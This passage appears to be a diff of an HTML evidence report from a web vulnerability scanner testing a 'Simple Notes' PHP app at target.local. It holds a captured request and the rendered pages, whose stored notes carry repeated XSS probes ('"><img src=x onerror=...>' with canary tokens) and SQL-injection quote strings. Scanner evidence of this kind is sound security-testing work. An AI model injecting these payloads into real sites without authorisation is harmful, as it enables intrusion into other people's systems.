+                                &lt;td&gt;&lt;h3&gt;xss-probe2&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=&amp;quot;window.__verdict_xss=\'stoXmqz5pnlnesg7\'&amp;quot;&amp;gt;&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdictstoXmqz5pw4hjk7lsafe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;titlexsstest&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=&amp;quot;window.__verdict_xss=\'stoXmqz5pw4hjk7l\'&amp;quot;&amp;gt;&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;titlexsstest&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;csrf-test&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;csrf-test&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;csrf-test&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;csrf-test&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;sqltest\'&amp;quot;&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;sqltestbody&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;xsstitle&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdictstoXmqz5wu4ogxiusafe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;xsstitle&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=&amp;quot;window.__verdict_xss=\'stoXmqz5wu4ogxiu\'&amp;quot;&amp;gt;&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdictstoXmqz5xl18ahhgsafe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;xssbody&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=&amp;quot;window.__verdict_xss=\'stoXmqz5xl18ahhg\'&amp;quot;&amp;gt;&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;xssbody&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdictsqli\'&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-sx&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdictstoXmqz60yqs3hdzsafe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-sx&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=&amp;quot;window.__verdict_xss=\'stoXmqz60yqs3hdz\'&amp;quot;&amp;gt;&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdictstoXmqz62ee74q67safe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-title-sink&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=&amp;quot;window.__verdict_xss=\'stoXmqz62ee74q67\'&amp;quot;&amp;gt;&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-title-sink&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;csrf-test&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;csrf-test-body&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;csrf-test&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;csrf-test-body&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdictSQLbase&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;sqlbaseline&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdictSQL\'&amp;quot;`--&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;sqlquote&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz72yer-5k</code> — <code>artifacts/_/ev-mqz72yer-5k/</code></div><div class="lbl">REQUEST</div><pre>GET /index.php HTTP/1.1
+Host: target.local:32873
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE (truncated)</div><pre>HTTP/1.1 200
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 27470
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 12:29:22 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=99
+pragma: no-cache
+server: Apache/2.4.38 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.1.33
+
+&lt;!doctype html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+      &lt;title&gt;Simple Notes&lt;/title&gt;
+      &lt;link rel=&quot;stylesheet&quot; href=&quot;static/styles.css&quot;&gt;
+      &lt;link rel=&quot;icon&quot; href=&quot;static/favicon.ico&quot; type=&quot;image/x-icon&quot;&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &amp;nbsp;&lt;/br&gt;
+        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                &lt;tr&gt;
+                    &lt;td width=&quot;90%&quot;&gt;&lt;h1&gt;Welcome test&lt;/h1&gt;&lt;/td&gt;
+                    &lt;td text-align=&quot;right&quot;&gt;&lt;a class=&quot;button&quot; href=&quot;logout.php&quot;&gt;Logout&lt;/a&gt;&lt;/td&gt;
+                &lt;/tr&gt;
+            &lt;/table&gt;
+        &lt;/div&gt;
+                                &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-testfile&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-content-marker&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;xss-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdictstoXmqz5ngu6676vsafe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;xss-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=&amp;quot;window.__verdict_xss=\'stoXmqz5ngu6676v\'&amp;quot;&amp;gt;&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;Zmark9h3&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;Zmark9body&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;xss-probe2&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdictstoXmqz5pnlnesg7safe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;xss-probe2&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=&amp;quot;window.__verdict_xss=\'stoXmqz5pnlnesg7\'&amp;quot;&amp;gt;&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdictstoXmqz5pw4hjk7lsafe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;titlexsstest&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=&amp;quot;window.__verdict_xss=\'stoXmqz5pw4hjk7l\'&amp;quot;&amp;gt;&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;titlexsstest&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;csrf-test&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;csrf-test&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;csrf-test&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;csrf-test&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;sqltest\'&amp;quot;&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;sqltestbody&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;xsstitle&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdictstoXmqz5wu4ogxiusafe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;xsstitle&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=&amp;quot;window.__verdict_xss=\'stoXmqz5wu4ogxiu\'&amp;quot;&amp;gt;&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdictstoXmqz5xl18ahhgsafe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;xssbody&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=&amp;quot;window.__verdict_xss=\'stoXmqz5xl18ahhg\'&amp;quot;&amp;gt;&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;xssbody&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdictsqli\'&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-sx&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdictstoXmqz60yqs3hdzsafe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-sx&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=&amp;quot;window.__verdict_xss=\'stoXmqz60yqs3hdz\'&amp;quot;&amp;gt;&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdictstoXmqz62ee74q67safe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-title-sink&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=&amp;quot;window.__verdict_xss=\'stoXmqz62ee74q67\'&amp;quot;&amp;gt;&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-title-sink&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;csrf-test&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;csrf-test-body&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;csrf-test&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;csrf-test-body&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdictSQLbase&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;sqlbaseline&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdictSQL\'&amp;quot;`--&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
